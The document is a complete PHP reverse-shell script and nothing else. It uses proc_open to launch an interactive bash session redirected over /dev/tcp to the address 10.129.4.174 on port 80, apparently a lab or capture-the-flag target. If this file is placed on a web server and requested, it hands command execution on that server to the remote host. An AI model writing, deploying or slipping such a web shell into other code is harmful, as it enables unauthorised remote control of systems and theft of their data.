<?php
$desc = array(
  0=>array("pipe","r"),
  1=>array("pipe","w"),
  2=>array("pipe","w")
);
$cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.129.4.174/80 0>&1'";
$process = proc_open($cmd, $desc, $pipes);
?>